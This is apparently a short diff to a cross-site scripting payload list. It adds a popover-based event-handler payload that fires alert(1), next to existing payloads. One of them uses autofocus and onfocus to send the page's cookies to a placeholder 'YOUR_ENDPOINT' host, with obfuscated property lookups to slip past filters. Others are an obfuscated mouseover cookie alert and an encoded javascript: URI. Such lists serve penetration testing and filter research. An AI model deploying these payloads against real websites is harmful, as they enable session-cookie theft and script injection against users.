@@ -1,3 +1,4 @@
+<button popovertarget=x>Click me</button><test onbeforetoggle=alert(1) popover id=x>test</test>
 "><input autofocus nope="%26quot;x%26quot;"onfocus="frames.location='YOUR_ENDPOINT?c='+Reflect.get(document,'coo'+'kie')">
 "><a nope="%26quot;x%26quot;"onmouseover="Reflect.get(frames,'ale'+'rt')(Reflect.get(document,'coo'+'kie'))">
 %26%2302java%26%23115cript:alert(document.domain)
